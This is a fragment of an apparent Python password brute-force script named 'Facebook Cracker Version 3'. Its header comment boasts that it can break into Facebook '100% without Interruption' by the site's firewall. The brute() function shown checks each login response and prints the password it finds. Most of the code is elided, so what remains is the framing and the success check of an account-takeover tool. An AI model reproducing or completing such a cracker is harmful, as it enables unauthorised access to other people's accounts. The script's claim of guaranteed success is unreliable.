#!usr/bin/python
#Facebook Cracker Version 3 can crack into Facebook Database 100% without Interruption By Facebook Firewall !
...
def brute(password):
	...
	if log != login and (not 'login_attempt' in log):
			print("\n\n[+] Password Find , Password is = {}".format(password))
